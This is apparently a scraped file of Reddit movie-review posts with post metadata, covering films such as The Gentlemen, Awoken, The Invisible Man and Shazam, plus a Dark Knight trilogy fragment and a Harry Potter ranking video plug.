1592010318.0,The Gentlemen,"Guy Ritchie has scored big on this one. It is so packed with excellent performances, its hard to know where to begin. Hugh Grant is my favorite, he embodies cunning and warmness in the same character. His portrayal of a slightly aging, rather seedy gay blackmailer is spot on. Besides nailing a working class accent he embodies a lovable, jovial character with sinister motives. My other favorite is the unflappable and stunningly dressed, cockney beauty running knocked off car parts, luxury car garage played by Michelle Dockery. She is razer sharp in this performance and doesn't turn a hair at any of the blood splashed on her flawless skin. Colin Farrel is brilliant as a Northern Irish coach for a young gentlemen fighters club, with his stable of polished tough guys. This is in my opinion is Guy Ritchies best movie so far,  with a tight plot leading us all over London.

You have seen a superhero franchise which now has the world in its grasp, you've seen one which made you believe in it but stooped down because they got lost in their own messed up timelines, you've seen ones which kept rebooting until they were total crap and then there's one which is trying so hard to replicate the Marvel formula that they've misplaced themselves. But today let's talk about the one which entered with a blast, stayed as if it owned everything and went out like a boss!


After the superhero movie revolution, which began with Bryan Singer's X-Men and Sam Raimi's Spiderman, a guy named Christopher Nolan shook the world with his ultra realistic and highly thrilling adaptation of DC Comics' iconic character Batman. I mean, who ever thought that a comic book movie series can be as dark, realistic and intense as the DKT was before its release. Dark Knight Trilogy made a statement that superheroes are not just for kids!

Every director had the same reference material for the character of Batman but with his out of the box thinking, Nolan directed a unique origin story in the form of Batman Begins. It had an engaging and thrilling story-line, an exceptional cast ensemble, well choreographed action, an amazing antagonist and of course a perfect Batman! Just when people thought it would be hard to recreate anything like it, came out The Dark Knight, which undeniably holds the mantle of the best comic book movie ever made (Says a hardcore Marvel fan; fight me all you want)! The Dark Knight Rises also served as a great dessert but unfortunately, couldn't come that close to magic of the starter and the main course.

1589226398.0,Awoken (2019) - Review,"  

This movie does the viewer a great service by informing the viewer the type of movie experience it will take him on in the first 5 minutes; it’s going to be a generic, slow, painful journey of a movie. Hopefully you didn’t pay for it or seek it out as a brief and cheap thrill to your otherwise boring day because there are better way’s to spend your time. This film hits every generic cliché before the movie even begins to gain any kind of traction as a form of entertainment.

Awoken starts, as these movies often do, in the past. A cheap and predictable jump scare later, it cuts to a bored main character in class. I don’t know why the main characters in these movies seem to know in a class that is extremely relevant to the plot, but here we are, in an incredibly foreshadowing lecture that kind of spoils the movie. Not that you should stick around for the rest of it anyways. It is also here that you learn, through lazy exposition, that the main character is orphaned by some mysterious event that will constantly be alluded till its lazy reveal. And of course her obsession to cure her brother’s insomnia is the driving force to the plot of the movie.

A bit hole in this movie is that everything about this girls life is written to make the plot work. Were she not a sleep scientist, having her life directly effected by the villain of the movie, or even been a sleep major, this movie could never happen. Were she a poetry major, for example, her brother would never be put in the hands of the demon. She wouldn’t even know which demon to research as even this seems to be handed to her as a way to move the plot forward. I understand that there is no such thing as a sleep major and I am leaving a lot of details extremely vague, but I want to break down the movie to its basic elements to show how incredibly generic and forced this plot is.

This movie clearly didn’t have enough plot to the movie. It seems to lazily movie from one moment of gore to the next to achieve shock. You see someone hang themselves because reasons and then it quickly tries to move to the next scene. There clearly wasn’t enough plot in this movie because when you aren’t watching gore, you get to watch the main character work on a failed relationship that existed off screen. If that doesn’t sound exciting to you, that is because it isn’t. There are so many failed attempts at creating character depth in this movie, but all the characters are forgettable. This is mostly because they try to create this depth through exposition dumps. The best part of the film is a weirdly placed Settlers of Catan reference, but that isn’t reason enough to watch this movie.

This movie is without any real substance. There are so many holes in this movie that it doesn’t make sense. The parts that do make sense are done lazily and are rather boring. The monster isn’t even scary. If you are a horror movie buff, you can find this concept done better elsewhere. This movie is so incredibly predictable that it becomes a chore to watch. Don’t pay for this movie, we can’t keep supporting these generic cash grabs for the sake of a movie date. We need content, narrative, and depth and this movie offers none of that.",moviereviews,3203,592,54,0
1588875494.0,The Invisible Man (2020) - Review,"  

I am not the hugest fan of Blumhouse because they usually disappoint. Because of this, I went into this movie expecting to hate it. I am honestly surprised at the result of this, it performed far better than I thought it would.

Cecelia runs away from her abusive and controlling husband, and this film shows the aftermath of this break up. As she begins to achieve normalcy and stability in her life, she gets news that her husband is dead. It is only when she begins to believe that she is finally free Andrew, he rears his ugly head, hell bent on destroying any peace Cecelia thinks she has. Now, Cecelia must survive as she tries to convince those around her that her invisible ex is ruining her life.

The Invisible Man takes the uncomfortable topic of domestic abuse and presents it respectfully. It isn’t brushed off as exposition, nor are there aren’t any scenes of abuse to add shock value to the movie. Instead, you get most of this story from Cecilia herself. The way she acts in the beginning of the film, scared and distrusting of everything, alone is enough to sell this narrative. Elisabeth Moss delivers a brilliant performance as you can honestly disturbingly believable. She isn’t a superhero victim with bruise makeup on. You see the fatigue take her over as the movie progresses. The way she dresses, acts, and even talks are in direct reaction to the amount of stress she comes under because of Andrew. What’s more, she starts to grow from these adversities which is something cool because when the climax arises, it isn’t because of some sudden burst of dumb luck and valor like traditional slashers, but she has finally had enough and wants the harassment to stop. This is one of the few movies where everything prior to this actually matters and contribute to the Cecilia’s character growth. It is an rare concept to find actual character development in slasher films, usually it devolves to a monster chasing stereotypes of people till the final brawl. 

But this movie is without it’s flaws. Some of the interactions are awkward and there are scenes in this movie that exist just to move the movie to the next plot point. The story isn’t incredibly original and some of the science and logic are thrown out the window in order to make the plot work. But these can be easily overlooked as this movie is still enjoyable. 

If you haven’t seen it, I strongly recommend checking it out. Especially if you are a fan of thrillers. Watch this because you like scary movies. Watch this because you want the suspense to grip you till the very end. Watch this movie for Moss’ performance! 

A word of caution however, the movie deals heavily with the topic of emotional and physical abuse and if that is a trigger for you, skip this movie.",moviereviews,2759,486,48,0

I am not a huge fan of live action superhero movies, but I love them in comics and animation. That said, I really wanted to like this movie. Who doesn’t want to see Captain Marvel in action! Unfortunately, this movie leaves a lot to be desired. This movie follows a foster kid Billy Batson who receives powers from an old order of wizards to protect the world form ancient evil. If it already sounds generic, that is because it is incredibly so. It is a troubled hero who is searching for his mother so that he can feel complete, only to have this search complicated by this new condition. 

What I thought the movie did well was how Billy initially reacts to his newfound powers. Suddenly, he has the powers to be an adult and he takes full advantage, engaging in adult activities teenage boys fantasize on. He buys beer for he and his friend, he goes to a strip club, and he excuses himself from school. It neat to see that he isn’t a completely good hero because his main interests aren’t to be traditional hero, but to use this power for personal gain. But this novelty quickly dissolves under the same tired formula we see in all origin stories. I for one am tired of watching training montages. It was good in Rocky and it worked in Spiderman but at this point, it just feels like padding for a movie that barely has a story. This montage isn’t anything new, it is the same jokes you see in every other movie where you see Billy fail over and over until he has some small form of mastery. If you are still watching the movie at this point, it doesn’t get any better. 

What you get after is an uninspired forgettable villain that he must defeat. And he is forgettable. When he shows up for the big fight, I had honestly forgotten he was part of the movie because there is nothing interesting. You get a bit of backstory, but not enough to set him aside as this menace. There is no pressure for him to become stronger like there is in other movies of the genre because the villain is mostly absent from the movie, save for the times he is sprinkled in to remind the audience. Early on you get the feeling that there aren’t any real consequences, even though people do die in this movie it doesn’t matter because you can probably guess that Captain Marvel will win through the power of friendship. It literally tells you minutes into the movie, and as generic as this movie is, you should not be surprised. It is apparent that this movie was just a cheap attempt to cash in on the super hero craze and it is a shame because I have seen DC movies where they are able to tell a compelling story without reverting to the same old tropes. 

Because there is no story, this movie lacks the character development to make even Captain marvel forgettable. The movie will flat out tell you important character traits, it’s an incredibly lazy way to fake a story. For example, there is a scene after the training montage where Billy sneaks back into the foster home his foster parents are disappointed that he ran away after the first night. He conveniently walks in at the end of this conversation and somehow understands the trouble he is causing. This is shown through a zoom cut to a remorseful Billy. There are no scenes where they spend time together, breaking down the metaphoric walls he’s built to protect his heart. There are no heart-warming scenes that suggest that maybe this collection of misfits could be his family. Instead you get a kid playing with his superpowers for a day and the movie telling you that Billy is experience character growth because it is written in the script. I wouldn’t have an issue with this if the movie hadn’t put so much emphasis on it’s importance. In the end when things seem the darkest, it is the love for his newfound family that gives him the power to persevere. See, it’s the same thing you’ve seen over and over again but not very well done. 

I wouldn’t pay for this movie. If you were unfortunate to pay for it, I am sorry you got ripped off. I wouldn’t even recommend this film if it were free because there is nothing really worth watching. It is a shame because I do prefer the DC universe, but it seems that they aren’t able to get their formula correct. Oh well, skip it.",moviereviews,4228,778,68,0

1587535292.0,Body at Brighton Rock review,"This post is more of a “vent” on how awful of a movie this is. The reviews online make it sound better than it is though they’re all still negative reviews. From the few high school level films I’ve seen, this could easily fit into that skill level. This movie has terrible editing, terrible acting, and a plot that is nearly nonexistent. I could only count 3 things that happened that would be somewhat important. These things would make the movie thirty minutes or less. I would never recommend it to anyone to watch this movie unless you want to waste nearly two hours of your life.",moviereviews,585,107,10,0
1587275318.0,[OC] Ranking All Eight Harry Potter Films | Youtube Video," 

[ The Harry Potter franchise is a huge favourite of mine.. But when you're my age that's not saying a whole lot because it's kind of EVERYONE'S lol... But even still, growing up watching this series of films, I kind of ended up gaining a strong knowledge about each entry and became hugely transfixed by them. So much so that I pretty much like all of them and consider even the worst of the series to be STRONG films.. They're just that good.



And so, I wanted to make a video talking about them.. So here I'm ranking each of the films from worst to first with the exclusion of the Fantastic Beasts films. (I'm keeping to the core 8 entries) And yeah, it's pretty straight forward from there.. If you're interested at all please check it out and let me know what your favs and least favs are in the comments!",moviereviews,814,152,28,0
